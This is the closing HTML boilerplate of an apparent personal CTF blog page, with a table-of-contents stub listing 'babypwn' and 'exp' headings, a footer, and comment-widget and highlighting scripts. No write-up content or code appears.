class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babypwn"><span class="toc-text">babypwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-5"><span class="toc-text">exp</span></a></li></ol></li></ol></li></ol></div></div></div><footer><nobr><span class="text-title">ICP</span><a class="text-content" target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">沪ICP备2021037250号-1  </a></nobr><nobr><span class="text-title">©</span><span class="text-content">2022 by i0gan</span></nobr><br></footer></aside></main><canvas id="canvas-dust"></canvas><div id="cursor-container"><div id="cursor-outer"></div><div id="cursor-effect"></div></div><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{new Valine({
 el: '#Valine'
 , appId: 'TzNey4n3v0Sx6vdBbytYLoH9-gzGzoHsz'
 , appKey: 'GIXXrK9zLxt0bZLww1hte0Oq' , placeholder: '此条评论委托企鹅物流发送'
});code.findCode();mermaid.init(undefined, ('.mermaid'));}</script><script src="//unpkg.com/@highlightjs/cdn-assets@11.4.0/highlight.min.js"></script><script src="/js/arknights.js"></script><script>window.addEventListener("load",()=>{reset()})</script></body></html>